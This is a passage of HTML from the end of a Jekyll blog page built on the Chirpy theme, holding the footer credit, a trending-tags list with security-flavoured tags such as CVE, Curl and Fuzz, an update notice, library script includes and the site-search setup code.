  <p>Using the <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme for <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a>.
  </p>
</footer>

          </div>
        </div>

        <!-- The Search results -->

<div id="search-result-wrapper" class="d-flex justify-content-center unloaded">
  <div class="col-11 content">
    <div id="search-hints">
      <!-- The trending tags list -->















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        



  <section>
    <h2 class="panel-heading">Trending Tags</h2>
    <div class="d-flex flex-wrap mt-3 mb-1 me-3">
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/linux/">Linux</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/web/">Web</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/api/">API</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/cve/">CVE</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/app/">App</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/code/">Code</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/curl/">Curl</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/docker/">Docker</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/execution/">Execution</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/fuzz/">Fuzz</a>
      
    </div>
  </section>


    </div>
    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
  </div>
</div>

      </div>

      <aside aria-label="Scroll to Top">
        <button id="back-to-top" type="button" class="btn btn-lg btn-box-shadow">
          <i class="fas fa-angle-up"></i>
        </button>
      </aside>
    </div>

    <div id="mask"></div>

    
      <aside
  id="notification"
  class="toast"
  role="alert"
  aria-live="assertive"
  aria-atomic="true"
  data-bs-animation="true"
  data-bs-autohide="false"
>
  <div class="toast-header">
    <button
      type="button"
      class="btn-close ms-auto"
      data-bs-dismiss="toast"
      aria-label="Close"
    ></button>
  </div>
  <div class="toast-body text-center pt-0">
    <p class="px-2 mb-3">A new version of content is available.</p>
    <button type="button" class="btn btn-primary" aria-label="Update">
      Update
    </button>
  </div>
</aside>

    

    <!-- JavaScripts -->

    <!-- JS selector for site. -->

<!-- commons -->



<!-- layout specified -->




  

  
    <!-- image lazy-loading & popup & clipboard -->
    
  















  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  



  <script src="https://cdn.jsdelivr.net/combine/npm/jquery@3.7.1/dist/jquery.min.js,npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js,npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js,npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.umd.min.js,npm/magnific-popup@1.1.0/dist/jquery.magnific-popup.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js,npm/dayjs@1.11.10/dayjs.min.js,npm/dayjs@1.11.10/locale/en.min.js,npm/dayjs@1.11.10/plugin/relativeTime.min.js,npm/dayjs@1.11.10/plugin/localizedFormat.min.js,npm/tocbot@4.25.0/dist/tocbot.min.js"></script>






<script defer src="/assets/js/dist/post.min.js"></script>






    

    <!--
  Jekyll Simple Search loader
  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
-->





<script>
  /* Note: dependent library will be loaded in `js-selector.html` */
  SimpleJekyllSearch({
    searchInput: document.getElementById('search-input'),
    resultsContainer: document.getElementById('search-results'),
    json: '/assets/js/data/search.json',
    searchResultTemplate: '  <article class="px-1 px-sm-2 px-lg-4 px-xl-0">    <header>      <h2><a href="{url}">{title}</a></h2>      <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">        {categories}        {tags}      </div>    </header>    <p>{snippet}</p>  </article>',
    noResultsText: '<p class="mt-5"></p>',
    templateMiddleware: function(prop, value, template) {
      if (prop === 'categories') {
        if (value === '') {
          return `${value}`;
        } else {
          return `<div class="me-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
        }
      }

      if (prop === 'tags') {
        if (value === '') {
          return `${value}`;
        } else {
          return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
        }
      }
    }
  });
</script>

  </body>
</html>

